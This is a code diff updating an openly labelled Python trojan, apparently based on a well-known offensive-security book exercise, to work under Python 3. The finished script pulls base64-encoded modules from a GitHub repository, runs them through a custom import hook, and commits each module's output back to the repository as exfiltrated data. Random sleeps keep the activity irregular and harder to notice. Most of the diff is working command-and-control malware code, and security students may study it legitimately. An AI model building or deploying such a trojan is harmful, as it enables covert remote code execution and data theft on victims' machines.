@@ -2,7 +2,6 @@ import json
 import base64
 import sys
 import time
-import importlib
 import random
 import threading
 import queue
@@ -18,15 +17,16 @@ configured     = False
 task_queue     = queue.Queue()
 
 def connect_to_github():
-    gh = login(username="username", password="password")
-    repo = gh.repository("username", "config")
+    username = "username"
+    password = "password"
+    gh = login(username=username, password=password)
+    repo = gh.repository(username, "config")
     branch = repo.branch("master")
 
     return gh,repo,branch
 
 def get_file_contents(filepath):
     gh,repo,branch = connect_to_github()
-    #print(vars(branch.commit.commit.tree))
     tree = branch.commit.commit.tree.to_tree().recurse()
 
     for filename in tree.tree:
@@ -40,44 +40,96 @@ def get_file_contents(filepath):
 def get_trojan_config():
     global configured
     config_json = get_file_contents(trojan_config)
-    b64=base64.b64decode(config_json)
-    print(b64)
-    config      = json.loads(b64)
+    config      = json.loads(base64.b64decode(config_json))
     configured  = True
 
     for task in config:
         if task['module'] not in sys.modules:
-            exec("improt %s" % task['module'])
+            exec("import %s" % task["module"])
 
     return config
 
 def store_module_result(data):
     gh,repo,branch = connect_to_github()
     remote_path = "data/%s/%d.data" % (trojan_id, random.randint(1000,100000))
-    repo.create_file(remote_path, "Commit message" , base64.b64encode(data))
+    repo.create_file(remote_path, "Commit message" , base64.b64encode(data.encode("utf-8")))
     return
 
-class GitImporter(object):
+#import imp
+#class GitImporter(object):
+#    def __init__(self):
+#        self.current_module_code = ""
+#
+#    def find_module(self, fullname, path=None):
+#        if configured:
+#            print("[*] Attempting to retrive %s" % fullname)
+#            new_library = get_file_contents("modules/%s" % fullname)
+#            if new_library is not None:
+#                self.current_module_code = base64.b64decode(new_library)
+#                #print(sys.modules)
+#                return self
+#        return None
+#
+#    def load_module(self, name):
+#        #module = importlib.import_module(name)
+#        module = imp.new_module(name)
+#        exec(self.current_module_code, module.__dict__)
+#        sys.modules[name] = module
+#        return module
+
+#import importlib
+#from importlib.machinery import ModuleSpec
+#class GitImporter(object):
+#    def __init__(self):
+#        self.current_module_code = ""
+#
+#    @classmethod
+#    def find_module(self, fullname, path=None):
+#        if configured:
+#            print("[*] Attempting to retrive %s" % fullname)
+#            new_library = get_file_contents("modules/%s" % fullname)
+#            if new_library is not None:
+#                self.current_module_code = base64.b64decode(new_library)
+#                #print(sys.modules)
+#                return self
+#        return None
+#
+#    @classmethod
+#    def load_module(self, name):
+#        spec = ModuleSpec(name,None)
+#        module = importlib.util.module_from_spec(spec)
+#        exec(self.current_module_code, module.__dict__)
+#        sys.modules[name] = module
+#        return module
+import importlib
+from importlib.abc import MetaPathFinder, Loader
+from importlib.machinery import ModuleSpec
+class GitImporter(Loader, MetaPathFinder):
     def __init__(self):
         self.current_module_code = ""
 
-    def find_module(self, fullname, path=None):
+    @classmethod
+    def create_module(cls, spec):
+        if spec.name in sys.modules:
+            module = importlib.util.module_from_spec(spec)
+            exec(cls.current_module_code, module.__dict__)
+            sys.modules[spec.name] = module
+            return module
+        return None
+
+    @classmethod
+    def exec_module(cls,module):
+        exec(cls.current_module_code, module.__dict__)
+
+    @classmethod
+    def find_spec(cls, fullname, path=None, target=None):
         if configured:
             print("[*] Attempting to retrive %s" % fullname)
             new_library = get_file_contents("modules/%s" % fullname)
-
             if new_library is not None:
-                self.current_module_code = base64.b64decode(new_library)
-                return self
-
+                cls.current_module_code = base64.b64decode(new_library)
+                return ModuleSpec(fullname,cls)
         return None
-
-    def load_module(self, name):
-        module = importlib.import_module(name)
-        exec( self.current_module_code in module.__dict__)
-        sys.modules[name] = module
-
-        return module
 
 def module_runner(module):
     task_queue.put(1)
@@ -95,8 +147,9 @@ while True:
         config = get_trojan_config()
 
         for task in config:
-            t = threading.Thread(target=module_runnner, args=(task['module'],))
+            t = threading.Thread(target=module_runner, args=(task['module'],))
             t.start()
             time.sleep(random.randint(1, 10))
+
     time.sleep(random.randint(1000,10000))
 
